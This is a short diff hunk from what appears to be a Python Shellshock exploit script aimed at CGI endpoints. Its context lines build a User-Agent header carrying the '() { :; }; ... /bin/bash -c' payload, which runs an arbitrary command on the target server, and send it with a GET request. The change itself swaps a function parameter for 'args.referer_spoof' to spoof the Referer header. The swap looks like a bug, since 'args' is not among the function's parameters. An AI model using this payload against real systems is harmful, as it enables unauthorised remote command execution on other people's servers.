@@ -24,8 +24,8 @@ def exploit(url, route_to_cgi, command, shell, lhost, lport, timeout, referer_sp
     else:
         headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '{}'".format(command)}
 
-    if referer_spoof:
-        headers["Referer"] = referer_spoof
+    if args.referer_spoof:
+        headers["Referer"] = args.referer_spoof
 
     cgi_url = url + route_to_cgi
     response = requests.get(cgi_url, headers=headers, timeout=timeout)
